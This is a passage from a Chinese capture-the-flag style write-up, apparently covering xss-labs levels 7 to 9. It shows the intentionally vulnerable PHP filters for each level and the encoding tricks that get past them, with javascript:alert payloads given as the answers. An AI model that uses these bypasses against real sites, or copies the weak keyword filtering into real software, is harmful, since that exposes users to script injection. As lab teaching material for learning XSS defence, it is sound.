class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strtolower&lt;&#x2F;span&gt;( &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;]);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;script&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;on&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;src&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;data&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;href&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level7.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level7.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 8&lt;&#x2F;p&gt;
&lt;p&gt;本题以添加下划线和html实体编码的形式绕过了href 、&lt;&gt; 、script 、&quot;等字符，我们可以采用HTML实体编码+URL编码的形式在URL中直接写入，也可以在input标签内输入HTML实体编码。input标签也会默认对Unicode进行解码，所以本题可使用编码方式绕过。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202154853561.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202154853561.png&quot; alt&#x3D;&quot;image-20240202154853561&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;相关网站：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;config.net.cn&#x2F;tools&#x2F;HtmlEncode.html&quot;&gt;在线Html实体编码解码&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.esjson.com&#x2F;urlEncode.html&quot;&gt;在线url网址编码解码&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.esjson.com&#x2F;unicodeEncode.html&quot;&gt;在线Unicode编码转换工具)&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;javaScript:alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;即：javascript:alert(1) #HTML实体编码-&gt;URL编码&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strtolower&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;]);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;script&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;scr_ipt&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;on&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;o_n&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;src&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;sr_c&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;data&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;da_ta&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;href&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;hr_ef&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str7&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&#x27;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&amp;quot&#x27;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level8.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt; &lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str7&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 9&lt;&#x2F;p&gt;
&lt;p&gt;本题相较Level 8新增了网址合法性检测，经测试只需带有&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;xn--zlr2ki56c6eedn6choa&#x2F;&quot;&gt;http:&#x2F;&#x2F;即可通过检测&lt;&#x2F;a&gt;，可以将alert()内的字符改成http:&#x2F;&#x2F;，也可以在文末添加并使用注释符进行注释。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202155310700.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240202155310700.png&quot; alt&#x3D;&quot;image-20240202155310700&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;javaScript:alert(&#39;http:&#x2F;&#x2F;&#39;)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;即：javascript:alert(‘http:&#x2F;&#x2F;’)&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strtolower&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;]);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;script&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;scr_ipt&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;on&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;o_n&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str2&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;src&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;sr_c&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str3&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;data&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;da_ta&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str4&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;href&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;hr_ef&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str5&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str7&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot;&#x27;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&amp;quot&#x27;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str6&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form action&#x3D;level9.php method&#x3D;GET&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;keyword  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span 